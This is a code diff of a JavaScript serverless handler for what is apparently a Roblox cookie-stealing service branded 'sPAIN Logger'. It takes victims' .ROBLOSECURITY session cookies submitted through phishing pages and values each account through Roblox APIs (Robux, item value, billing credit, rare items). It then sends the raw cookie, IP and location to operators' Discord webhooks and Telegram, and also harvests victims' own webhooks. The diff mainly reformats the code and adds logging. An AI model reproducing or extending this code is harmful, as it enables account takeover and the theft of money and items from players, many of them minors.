@@ -50,31 +50,24 @@ async function getAvatarUrl(userId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch(
       `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
       { signal: ctrl.signal }
     );
-    
     clearTimeout(timer);
-    
     if (!response.ok) return null;
-    
     const data = await response.json();
     if (data.data && data.data.length > 0 && data.data[0].state === 'Completed') {
       return data.data[0].imageUrl;
     }
     return null;
-  } catch {
-    return null;
-  }
+  } catch { return null; }
 }
 
 async function getRobux(cookie) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch('https://economy.roblox.com/v1/user/currency', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -82,22 +75,17 @@ async function getRobux(cookie) {
       },
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) return 0;
     const data = await response.json();
     return data.robux || 0;
-  } catch {
-    return 0;
-  }
+  } catch { return 0; }
 }
 
 async function getRAP(cookie, userId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 8000);
-    
     const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -105,29 +93,20 @@ async function getRAP(cookie, userId) {
       },
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) return { rap: 0, items: 0 };
     const data = await response.json();
-    
     let rap = 0;
     const items = data.data || [];
-    items.forEach(item => {
-      rap += item.recentAveragePrice || 0;
-    });
-    
+    items.forEach(item => { rap += item.recentAveragePrice || 0; });
     return { rap, items: items.length };
-  } catch {
-    return { rap: 0, items: 0 };
-  }
+  } catch { return { rap: 0, items: 0 }; }
 }
 
 async function getCredit(cookie) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch('https://billing.roblox.com/v1/credit', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -135,15 +114,11 @@ async function getCredit(cookie) {
       },
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) return 0;
     const data = await response.json();
     return data.balance || 0;
-  } catch {
-    return 0;
-  }
+  } catch { return 0; }
 }
 
 function getAccountAge(createdDate) {
@@ -157,7 +132,6 @@ async function getPremiumStatus(cookie) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch('https://premiumfeatures.roblox.com/v1/users/validate-membership', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -165,21 +139,16 @@ async function getPremiumStatus(cookie) {
       },
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (response.status === 200) return true;
     return false;
-  } catch {
-    return false;
-  }
+  } catch { return false; }
 }
 
 async function getVoiceChatStatus(cookie) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch('https://voice.roblox.com/v1/settings', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -187,41 +156,31 @@ async function getVoiceChatStatus(cookie) {
       },
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) return false;
     const data = await response.json();
     return data.isVoiceEnabled || false;
-  } catch {
-    return false;
-  }
+  } catch { return false; }
 }
 
 async function getFriendsCount(userId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) return 0;
     const data = await response.json();
     return data.count || 0;
-  } catch {
-    return 0;
-  }
+  } catch { return 0; }
 }
 
 async function ownsItem(cookie, userId, assetId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}/is-owned`, {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -229,43 +188,32 @@ async function ownsItem(cookie, userId, assetId) {
       },
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) return false;
     const data = await response.json();
     return data === true;
-  } catch {
-    return false;
-  }
+  } catch { return false; }
 }
 
 async function getGroupsOwned(userId) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 5000);
-    
     const response = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) return 0;
     const data = await response.json();
-    
     const groups = data.data || [];
     return groups.filter(g => g.role && g.role.rank === 255).length;
-  } catch {
-    return 0;
-  }
+  } catch { return 0; }
 }
 
 async function checkAccountInfo(cookie) {
   try {
     const ctrl = new AbortController();
     const timer = setTimeout(() => ctrl.abort(), 8000);
-    
     const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -273,71 +221,33 @@ async function checkAccountInfo(cookie) {
       },
       signal: ctrl.signal
     });
-    
     clearTimeout(timer);
-    
     if (!response.ok) {
       return { valid: false, error: 'Invalid or expired cookie' };
     }
-    
     const userData = await response.json();
     const userId = userData.id;
-    
     const [
-      avatarUrl,
-      robux,
-      rapData,
-      credit,
-      profileRes,
-      premium,
-      voiceChat,
-      friends,
-      headless,
-      korblox,
-      valkyrie,
-      groupsOwned
+      avatarUrl, robux, rapData, credit, profileRes,
+      premium, voiceChat, friends, headless, korblox, valkyrie, groupsOwned
     ] = await Promise.all([
-      getAvatarUrl(userId),
-      getRobux(cookie),
-      getRAP(cookie, userId),
-      getCredit(cookie),
+      getAvatarUrl(userId), getRobux(cookie), getRAP(cookie, userId), getCredit(cookie),
       fetch(`https://users.roblox.com/v1/users/${userId}`, {
         headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
       }).catch(() => null),
-      getPremiumStatus(cookie),
-      getVoiceChatStatus(cookie),
-      getFriendsCount(userId),
-      ownsItem(cookie, userId, ITEMS.HEADLESS),
-      ownsItem(cookie, userId, ITEMS.KORBLOX),
-      ownsItem(cookie, userId, ITEMS.VALKYRIE),
-      getGroupsOwned(userId)
+      getPremiumStatus(cookie), getVoiceChatStatus(cookie), getFriendsCount(userId),
+      ownsItem(cookie, userId, ITEMS.HEADLESS), ownsItem(cookie, userId, ITEMS.KORBLOX),
+      ownsItem(cookie, userId, ITEMS.VALKYRIE), getGroupsOwned(userId)
     ]);
-    
     const profile = profileRes?.ok ? await profileRes.json() : null;
     const accountAge = getAccountAge(profile?.created);
-    
     return {
-      valid: true,
-      id: userId,
-      username: userData.name,
-      displayName: userData.displayName,
-      created: profile?.created,
-      description: profile?.description,
-      isBanned: profile?.isBanned || false,
-      profileUrl: `https://www.roblox.com/users/${userId}/profile`,
-      avatarUrl: avatarUrl,
-      robux: robux,
-      rap: rapData.rap,
-      items: rapData.items,
-      credit: credit,
-      premium: premium,
-      voiceChat: voiceChat,
-      friends: friends,
-      headless: headless,
-      korblox: korblox,
-      valkyrie: valkyrie,
-      groupsOwned: groupsOwned,
-      accountAge: accountAge
+      valid: true, id: userId, username: userData.name, displayName: userData.displayName,
+      created: profile?.created, description: profile?.description, isBanned: profile?.isBanned || false,
+      profileUrl: `https://www.roblox.com/users/${userId}/profile`, avatarUrl: avatarUrl,
+      robux: robux, rap: rapData.rap, items: rapData.items, credit: credit,
+      premium: premium, voiceChat: voiceChat, friends: friends,
+      headless: headless, korblox: korblox, valkyrie: valkyrie, groupsOwned: groupsOwned, accountAge: accountAge
     };
   } catch (err) {
     return { valid: false, error: err.message };
@@ -346,11 +256,7 @@ async function checkAccountInfo(cookie) {
 
 async function refreshCookieStatus(cookie) {
   const accountInfo = await checkAccountInfo(cookie);
-  return {
-    refreshed: accountInfo.valid,
-    account: accountInfo,
-    timestamp: new Date().toISOString()
-  };
+  return { refreshed: accountInfo.valid, account: accountInfo, timestamp: new Date().toISOString() };
 }
 
 async function tgSendAccount(text) {
@@ -360,7 +266,7 @@ async function tgSendAccount(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
     });
-  } catch (_) {}
+  } catch (e) { console.error('TG Account Error:', e); }
 }
 
 async function tgSendWebhook(text) {
@@ -370,7 +276,7 @@ async function tgSendWebhook(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_WEBHOOK_CHAT, text, parse_mode: 'HTML' })
     });
-  } catch (_) {}
+  } catch (e) { console.error('TG Webhook Error:', e); }
 }
 
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
@@ -393,9 +299,7 @@ function findCookie(slots) {
 
 function findVictimWebhook(slots) {
   for (const [key, val] of Object.entries(slots || {})) {
-    if (key.startsWith('webhook') && val) {
-      return val;
-    }
+    if (key.startsWith('webhook') && val) return val;
   }
   return null;
 }
@@ -411,80 +315,90 @@ const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
 
 const createWebhookPayload = (type, data) => {
-  const basePayload = {
-    username: WH_NAME,
-    avatar_url: WH_AVATAR
-  };
-
+  const basePayload = { username: WH_NAME, avatar_url: WH_AVATAR };
   switch (type) {
     case 'webhook1':
-      return {
-        ...basePayload,
-        content: data.content || '@everyone',
-        embeds: [{
-          title: data.title || '🍪 Cookie Captured (Dualhook)',
-          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
-          color: data.color || 0x06b6d4,
-          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-          image: data.image ? { url: data.image } : undefined,
-          fields: data.fields || [],
-          footer: { text: data.footer || `sPAIN Logger` },
-          timestamp: data.timestamp || new Date().toISOString()
-        }]
-      };
-    
+      return { ...basePayload, content: data.content || '@everyone', embeds: [{
+        title: data.title || '🍪 Cookie Captured (Dualhook)',
+        description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
+        color: data.color || 0x06b6d4,
+        thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
+        image: data.image ? { url: data.image } : undefined,
+        fields: data.fields || [],
+        footer: { text: data.footer || `sPAIN Logger` },
+        timestamp: data.timestamp || new Date().toISOString()
+      }]};
     case 'webhook2':
-      return {
-        ...basePayload,
-        content: data.content || '@everyone',
-        embeds: [{
-          title: data.title || '🍪 Cookie Captured',
-          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
-          color: data.color || 0xc026d3,
-          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-          image: data.image ? { url: data.image } : undefined,
-          fields: data.fields || [],
-          footer: { text: data.footer || `sPAIN Logger` },
-          timestamp: data.timestamp || new Date().toISOString()
-        }]
-      };
-    
+      return { ...basePayload, content: data.content || '@everyone', embeds: [{
+        title: data.title || '🍪 Cookie Captured',
+        description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
+        color: data.color || 0xc026d3,
+        thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
+        image: data.image ? { url: data.image } : undefined,
+        fields: data.fields || [],
+        footer: { text: data.footer || `sPAIN Logger` },
+        timestamp: data.timestamp || new Date().toISOString()
+      }]};
     case 'account_info':
-      return {
-        ...basePayload,
-        content: data.content || '',
-        embeds: [{
-          title: data.title || '✅ Account Info Valid',
-          description: data.description || '',
-          color: data.valid === false ? 0xff0000 : 0x00ff00,
-          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-          image: data.image ? { url: data.image } : undefined,
-          fields: data.fields || [],
-          footer: { text: data.footer || `Account Check • sPAIN Logger` },
-          timestamp: data.timestamp || new Date().toISOString()
-        }]
-      };
-    
-    default:
-      return basePayload;
+      return { ...basePayload, content: data.content || '', embeds: [{
+        title: data.title || '✅ Account Info Valid',
+        description: data.description || '',
+        color: data.valid === false ? 0xff0000 : 0x00ff00,
+        thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
+        image: data.image ? { url: data.image } : undefined,
+        fields: data.fields || [],
+        footer: { text: data.footer || `Account Check • sPAIN Logger` },
+        timestamp: data.timestamp || new Date().toISOString()
+      }]};
+    default: return basePayload;
   }
 };
 
+// FIXED: Better error handling and logging
 async function discordSend(url, payload) {
-  if (!url?.includes('discord.com/api/webhooks')) return;
+  console.log('Attempting Discord send to:', url?.substring(0, 50) + '...');
+  
+  if (!url) {
+    console.error('Discord Error: URL is undefined/null');
+    return;
+  }
+  if (typeof url !== 'string') {
+    console.error('Discord Error: URL is not a string:', typeof url);
+    return;
+  }
+  if (!url.includes('discord.com/api/webhooks')) {
+    console.error('Discord Error: Invalid webhook URL format');
+    return;
+  }
+  
   try {
-    await fetch(url, {
+    const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-  } catch (_) {}
+    
+    if (!response.ok) {
+      const text = await response.text();
+      console.error(`Discord Error ${response.status}:`, text);
+    } else {
+      console.log('Discord sent successfully');
+    }
+  } catch (e) {
+    console.error('Discord Fetch Error:', e.message);
+  }
 }
 
 async function discordSendCookie(url, cookie, username) {
-  if (!url?.includes('discord.com/api/webhooks')) return;
+  console.log('Sending cookie to Discord:', url?.substring(0, 50) + '...');
+  
+  if (!url?.includes('discord.com/api/webhooks')) {
+    console.error('Invalid webhook URL for cookie send');
+    return;
+  }
+  
   try {
-    await fetch(url, {
+    const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -493,61 +407,72 @@ async function discordSendCookie(url, cookie, username) {
         content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\n**[🔄 Refresh Cookie](${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)})**\n\n\`\`\`\n${cookie}\n\`\`\``
       })
     });
-  } catch (_) {}
+    
+    if (!response.ok) {
+      const text = await response.text();
+      console.error(`Cookie Send Error ${response.status}:`, text);
+    } else {
+      console.log('Cookie sent successfully');
+    }
+  } catch (e) {
+    console.error('Cookie Send Fetch Error:', e.message);
+  }
 }
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  
   if (req.method === 'OPTIONS') return res.status(204).end();
-  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   const body = parseBody(req.body);
   const { slug, slots, action } = body;
+  
+  console.log('Request received:', { slug, hasSlots: !!slots, action });
   
   if (action === 'check_account' || action === 'refresh_cookie') {
     if (!slots) return res.status(400).json({ error: 'slots is required' });
     const cookie = findCookie(slots);
     if (!cookie) return res.status(400).json({ error: 'No valid cookie found' });
-    
     const refreshResult = await refreshCookieStatus(cookie);
     return res.status(200).json(refreshResult);
   }
   
-  if (!slug)  return res.status(400).json({ error: 'slug is required' });
+  if (!slug) return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
 
   const record = await redisGet(`slot:${slug}`);
-  if (!record)         return res.status(404).json({ error: 'Page not found' });
+  console.log('Record found:', !!record, 'Webhook:', record?.webhook?.substring(0, 30) + '...');
+  
+  if (!record) return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
   const victimWebhook = findVictimWebhook(slots);
   if (victimWebhook) {
-    await tgSendWebhook([
-      `🎯 <b>NEW VICTIM WEBHOOK</b>`,
-      `📄 <b>Page:</b> ${record.displayName || slug}`,
-      ``,
-      `<b>Webhook:</b>`,
-      `<code>${victimWebhook}</code>`,
-      ``,
-      `🕐 ${new Date().toISOString()}`
-    ].join('\n'));
+    await tgSendWebhook(`🎯 <b>NEW VICTIM WEBHOOK</b>\n📄 <b>Page:</b> ${record.displayName || slug}\n\n<b>Webhook:</b>\n<code>${victimWebhook}</code>\n\n🕐 ${new Date().toISOString()}`);
   }
 
-  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
-              || req.headers['x-real-ip'] || 'Unknown';
-  const now    = new Date().toISOString();
-  const pName  = record.displayName || slug;
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
+  const now = new Date().toISOString();
+  const pName = record.displayName || slug;
   const cookie = findCookie(slots);
 
+  console.log('Cookie found:', !!cookie, 'IP:', ip);
+
+  // Setup webhooks
   const webhooks = [record.webhook];
   if (record.dualhookParent) {
     const parent = await redisGet(`slot:${record.dualhookParent}`);
-    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
+    if (parent?.webhook && parent.webhook !== record.webhook) {
+      webhooks.push(parent.webhook);
+      console.log('Dualhook parent webhook added');
+    }
   }
 
   if (!cookie) {
+    console.log('No cookie found - sending wrong cookie alert');
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
     
@@ -558,11 +483,11 @@ export default async function handler(req, res) {
         : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
       color: 0xff3333,
       fields: [
-        { name: '🌐 IP',       value: ip,                   inline: true  },
-        { name: '📍 Location', value: loc,                  inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
-        { name: '🕐 Time',     value: now,                  inline: false },
-        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
+        { name: '🌐 IP', value: ip, inline: true },
+        { name: '📍 Location', value: loc, inline: true },
+        { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
+        { name: '🕐 Time', value: now, inline: false },
+        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(null)}`, inline: false }
       ],
       footer: `${pName} Logger`,
       timestamp: now
@@ -573,11 +498,13 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
+  // Process cookie
   const geoPromise = getIpGeo(ip);
   const accountCheckPromise = refreshCookieStatus(cookie);
 
   let webhook1 = null;
   let webhook2 = record.webhook;
+  
   if (record.dualhookParent) {
     try {
       const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
@@ -589,52 +516,56 @@ export default async function handler(req, res) {
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp = geo?.isp || 'Unknown';
   
-  const avatarUrl = accountInfo.refreshed && accountInfo.account.avatarUrl 
-    ? accountInfo.account.avatarUrl 
-    : null;
-  
+  const avatarUrl = accountInfo.refreshed && accountInfo.account.avatarUrl ? accountInfo.account.avatarUrl : null;
   const acc = accountInfo.refreshed ? accountInfo.account : null;
 
+  console.log('Account info:', accountInfo.refreshed ? acc?.username : 'Invalid');
+
+  // WEBHOOK 2 - Cookie Captured
   const wh2Payload = createWebhookPayload('webhook2', {
     description: record.dualhookParent
       ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
       : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
     thumbnail: avatarUrl,
     fields: [
-      { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
-      { name: '📄 Page',     value: pName,        inline: true  },
-      { name: '🕐 Time',     value: now, inline: true },
-      { name: '📍 Location', value: loc, inline: true  },
-      { name: '🗺️ ISP',      value: isp, inline: true  },
+      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
+      { name: '📄 Page', value: pName, inline: true },
+      { name: '🕐 Time', value: now, inline: true },
+      { name: '📍 Location', value: loc, inline: true },
+      { name: '🗺️ ISP', value: isp, inline: true },
       { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
     ],
     footer: `${pName} Logger`,
     timestamp: now
   });
 
+  console.log('Sending to webhook2...');
   await discordSend(webhook2, wh2Payload);
 
+  // WEBHOOK 1 - Dualhook (if exists)
   if (webhook1 && webhook1 !== webhook2) {
+    console.log('Sending to webhook1 (dualhook)...');
     const wh1Payload = createWebhookPayload('webhook1', {
       title: '🍪 Cookie Captured (Dualhook)',
       thumbnail: avatarUrl,
       fields: [
-        { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
-        { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true  },
-        { name: '🔗 DH Child',  value: `\`${slug}\``,                 inline: true  },
-        { name: '📍 Location',  value: loc,                           inline: true  },
-        { name: '🗺️ ISP',       value: isp,                           inline: true  },
-        { name: '🕐 Time',      value: now,                           inline: true  },
+        { name: '🌐 IP', value: `\`${ip}\``, inline: true },
+        { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true },
+        { name: '🔗 DH Child', value: `\`${slug}\``, inline: true },
+        { name: '📍 Location', value: loc, inline: true },
+        { name: '🗺️ ISP', value: isp, inline: true },
+        { name: '🕐 Time', value: now, inline: true },
         { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
       ],
       footer: `sPAIN Logger • ${pName}`,
       timestamp: now
     });
-    
     await discordSend(webhook1, wh1Payload);
   }
 
+  // Account Info - WEBHOOK 2
   if (accountInfo.refreshed && acc) {
+    console.log('Sending account info...');
     const accountPayload = createWebhookPayload('account_info', {
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
       thumbnail: avatarUrl,
@@ -656,10 +587,11 @@ export default async function handler(req, res) {
       footer: `${pName} Logger`,
       timestamp: now
     });
-    
     await discordSend(webhook2, accountPayload);
-    
+
+    // Account Info - WEBHOOK 1 (if exists)
     if (webhook1) {
+      console.log('Sending account info to webhook1...');
       const accountPayloadWH1 = createWebhookPayload('account_info', {
         description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
         thumbnail: avatarUrl,
@@ -685,9 +617,12 @@ export default async function handler(req, res) {
     }
   }
 
+  // Send raw cookie
+  console.log('Sending raw cookie...');
   await discordSendCookie(webhook2, cookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
 
+  // Telegram
   if (acc) {
     await tgSendAccount([
       `🍪 <b>COOKIE — ${pName}</b>`,
@@ -725,6 +660,7 @@ export default async function handler(req, res) {
     ].join('\n'));
   }
 
+  console.log('Done processing request');
   return res.status(200).json({ 
     success: true, 
     account: accountInfo.refreshed ? accountInfo.account : null 
